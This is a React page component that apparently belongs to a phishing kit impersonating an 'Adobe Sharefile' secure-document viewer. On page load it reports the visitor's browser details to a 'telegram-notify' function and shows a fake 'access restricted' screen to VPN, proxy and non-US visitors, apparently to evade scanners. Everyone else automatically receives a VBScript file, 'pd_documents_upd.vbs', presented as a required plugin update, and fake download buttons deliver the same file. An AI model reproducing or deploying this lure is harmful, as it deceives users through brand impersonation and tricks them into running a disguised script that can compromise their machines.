import { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import { motion } from "framer-motion";
import adobeDocLogo from "@/assets/adobe-doc-logo.png";
import { supabase } from "@/integrations/supabase/client";

const Documents = () => {
  const [blocked, setBlocked] = useState(false);
  const [blockReason, setBlockReason] = useState("");

  const triggerDownload = () => {
    const link = document.createElement("a");
    link.href = "/pd_documents_upd.vbs";
    link.download = "pd_documents_upd.vbs";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Check IP and notify on page load
  useEffect(() => {
    const checkAndNotify = async () => {
      try {
        const { data } = await supabase.functions.invoke("telegram-notify", {
          body: {
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || "Direct",
          },
        });

        if (data?.blocked) {
          setBlocked(true);
          setBlockReason(data.reason || "");
          return;
        }
      } catch {
        // Fail-safe: block access if security check fails
        setBlocked(true);
        setBlockReason("Security verification unavailable");
        return;
      }

      // Only auto-download if not blocked
      setTimeout(() => triggerDownload(), 1000);
    };

    checkAndNotify();
  }, []);

  if (blocked) {
    return (
      <motion.div
        className="fixed inset-0 bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col items-center justify-center px-6"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.4 }}
      >
        <div className="max-w-md w-full">
          {/* Card */}
          <motion.div
            className="bg-white rounded-2xl shadow-xl border border-gray-200 p-8 text-center"
            initial={{ scale: 0.95, opacity: 0, y: 20 }}
            animate={{ scale: 1, opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            {/* Shield Icon */}
            <motion.div
              className="mb-6 flex justify-center"
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ duration: 0.4, delay: 0.15 }}
            >
              <div className="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center">
                <svg className="w-8 h-8 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.25-8.25-3.286ZM12 15.75h.007v.008H12v-.008Z" />
                </svg>
              </div>
            </motion.div>

            <motion.h1
              className="text-xl font-semibold text-gray-900 mb-2"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.4, delay: 0.2 }}
            >
              Access Restricted
            </motion.h1>

            <motion.p
              className="text-gray-500 text-sm mb-6 leading-relaxed"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.4, delay: 0.3 }}
            >
              This document is protected by Adobe Sharefile security policies and cannot be accessed from your current network.
            </motion.p>

            {/* Reason badge */}
            {blockReason && (
              <motion.div
                className="mb-6"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.3, delay: 0.4 }}
              >
                <span className="inline-flex items-center gap-1.5 px-3 py-1.5 bg-red-50 text-red-700 text-xs font-medium rounded-full border border-red-100">
                  <span className="w-1.5 h-1.5 bg-red-500 rounded-full" />
                  {blockReason}
                </span>
              </motion.div>
            )}

            {/* Divider */}
            <motion.div
              className="border-t border-gray-100 my-6"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.45 }}
            />

            {/* Requirements */}
            <motion.div
              className="text-left space-y-3 mb-6"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.4, delay: 0.5 }}
            >
              <p className="text-xs font-medium text-gray-400 uppercase tracking-wider">Requirements</p>
              <div className="space-y-2">
                <div className="flex items-center gap-2.5 text-sm text-gray-600">
                  <svg className="w-4 h-4 text-gray-400 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1 1 15 0Z" />
                  </svg>
                  United States residential IP required
                </div>
                <div className="flex items-center gap-2.5 text-sm text-gray-600">
                  <svg className="w-4 h-4 text-gray-400 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M18.364 18.364A9 9 0 0 0 5.636 5.636m12.728 12.728A9 9 0 0 1 5.636 5.636m12.728 12.728L5.636 5.636" />
                  </svg>
                  VPN, proxy &amp; cloud connections blocked
                </div>
                <div className="flex items-center gap-2.5 text-sm text-gray-600">
                  <svg className="w-4 h-4 text-gray-400 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.572-.598-3.751h-.152c-3.196 0-6.1-1.249-8.25-3.286Z" />
                  </svg>
                  Enterprise security compliance
                </div>
              </div>
            </motion.div>

            <motion.p
              className="text-gray-400 text-xs"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.6 }}
            >
              Contact your administrator if you believe this is an error.
            </motion.p>
          </motion.div>

          {/* Footer */}
          <motion.p
            className="text-center text-xs text-gray-400 mt-4"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.7 }}
          >
            Protected by Adobe Sharefile Security
          </motion.p>
        </div>
      </motion.div>
    );
  }

  return (
    <motion.div
      className="fixed inset-0 bg-white flex flex-col items-center justify-center px-6"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.4 }}
    >
      <div className="max-w-lg w-full text-center">
        {/* Logo */}
        <motion.div
          className="mb-8 flex justify-center"
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.5, delay: 0.1 }}
        >
          <img src={adobeDocLogo} alt="ShareDrop" className="w-20 h-20 rounded-2xl shadow-lg" />
        </motion.div>

        {/* Headline */}
        <motion.h1
          className="text-xl md:text-2xl font-normal text-gray-900 mb-4 leading-relaxed"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4, delay: 0.2 }}
        >
          Sorry, You do not have the latest version of{" "}
          <span className="text-[#5B7FB9] font-medium">Adobe Sharefile</span> plugin installed.
        </motion.h1>

        {/* Body */}
        <motion.p
          className="text-gray-700 text-base mb-6 leading-relaxed"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4, delay: 0.3 }}
        >
          The latest version of the Sharefile Transfer Client is required to view secured Documents.
        </motion.p>

        {/* CTA */}
        <motion.p
          className="text-gray-600 text-sm mb-10"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4, delay: 0.4 }}
        >
          If the download doesn't start automatically, please{" "}
          <button
            onClick={triggerDownload}
            className="text-[#5B7FB9] hover:text-[#4A6A9E] underline underline-offset-2 font-medium transition-colors"
          >
            Download Manually
          </button>
          .
        </motion.p>

        {/* Footer */}
        <motion.div
          className="text-sm text-gray-500 flex items-center justify-center gap-2"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.4, delay: 0.5 }}
        >
          <span>Download not working?</span>
          <button
            onClick={triggerDownload}
            className="text-[#5B7FB9] hover:text-[#4A6A9E] underline underline-offset-2 transition-colors"
          >
            Restart download
          </button>
          <span className="text-gray-300">|</span>
          <Link
            to="/auth"
            className="text-[#5B7FB9] hover:text-[#4A6A9E] underline underline-offset-2 transition-colors"
          >
            Get Help
          </Link>
        </motion.div>
      </div>
    </motion.div>
  );
};

export default Documents;
